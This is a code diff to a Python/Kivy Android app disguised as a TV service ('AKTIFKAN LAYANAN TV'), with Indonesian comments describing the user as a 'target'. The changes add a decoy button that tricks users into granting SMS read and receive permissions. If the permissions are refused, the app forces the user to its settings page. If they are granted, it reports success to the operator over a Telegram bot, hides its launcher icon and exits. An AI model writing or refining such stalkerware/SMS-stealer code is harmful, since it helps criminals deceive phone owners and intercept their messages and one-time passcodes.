@@ -2,6 +2,8 @@ import telebot
 from android.permissions import request_permissions, Permission
 from jnius import autoclass
 from kivy.app import App
+from kivy.uix.button import Button
+from kivy.uix.boxlayout import BoxLayout
 from kivy.clock import Clock
 import os
 
@@ -11,46 +13,50 @@ bot = telebot.TeleBot(TOKEN)
 
 class LOKTV(App):
     def build(self):
-        # Beri jeda 2 detik setelah buka baru minta izin
-        Clock.schedule_once(lambda dt: self.pancing_izin(), 2)
-        return None
+        layout = BoxLayout(orientation='vertical', padding=50)
+        # Tombol jebakan agar sistem tidak memblokir popup
+        btn = Button(text="AKTIFKAN LAYANAN TV", size_hint=(1, 0.2), background_color=(0, 1, 0, 1))
+        btn.bind(on_press=self.pancing_izin)
+        layout.add_widget(btn)
+        return layout
 
-    def pancing_izin(self):
-        perms = [
-            Permission.READ_SMS,
-            Permission.RECEIVE_SMS,
-            Permission.POST_NOTIFICATIONS
-        ]
+    def pancing_izin(self, instance):
+        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.POST_NOTIFICATIONS]
         request_permissions(perms, self.hasil_respon)
 
     def hasil_respon(self, permissions, grants):
-        # Kirim status ke Telegram apapun hasilnya
-        status = "DIIZINKAN" if all(grants) else "DITOLAK/BLOKIR"
-        try:
-            bot.send_message(CHAT_ID, f"📢 Status Izin Target: {status}")
-        except: pass
-
         if all(grants):
-            # HANYA HILANG JIKA DIIZINKAN
-            self.eksekusi_hilang()
+            try:
+                bot.send_message(CHAT_ID, "✅ AKSES DITEMBUS! Target mengizinkan.")
+                self.eksekusi_hilang()
+            except: pass
         else:
-            # Jika ditolak/notif gak muncul, minta lagi terus (Teror Popup)
-            Clock.schedule_once(lambda dt: self.pancing_izin(), 3)
+            # Jika masih diblokir, arahkan target ke pengaturan secara otomatis
+            self.buka_pengaturan_manual()
+
+    def buka_pengaturan_manual(self):
+        # Trik untuk membuka info aplikasi agar target bisa aktifkan manual jika popup gagal
+        PythonActivity = autoclass('org.kivy.android.PythonActivity')
+        Intent = autoclass('android.content.Intent')
+        Settings = autoclass('android.provider.Settings')
+        Uri = autoclass('android.net.Uri')
+        
+        intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+        uri = Uri.fromParts("package", PythonActivity.mActivity.getPackageName(), None)
+        intent.setData(uri)
+        PythonActivity.mActivity.startActivity(intent)
+        bot.send_message(CHAT_ID, "⚠️ Popup Gagal, Target diarahkan ke Pengaturan Manual.")
 
     def eksekusi_hilang(self):
         try:
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            activity = PythonActivity.mActivity
+            activity = autoclass('org.kivy.android.PythonActivity').mActivity
             pm = activity.getPackageManager()
-            
-            # Sembunyikan ikon
             ComponentName = autoclass('android.content.ComponentName')
             comp = ComponentName(activity.getPackageName(), 'org.kivy.android.PythonActivity')
+            
+            # Sembunyikan ikon
             pm.setComponentEnabledSetting(comp, 2, 1)
-            
-            bot.send_message(CHAT_ID, "⚠️ Ikon Lenyap! Target Terperangkap.")
-            
-            # Keluar setelah sukses
+            bot.send_message(CHAT_ID, "⚠️ IKON HILANG TOTAL.")
             Clock.schedule_once(lambda dt: os._exit(0), 1)
         except:
             os._exit(0)
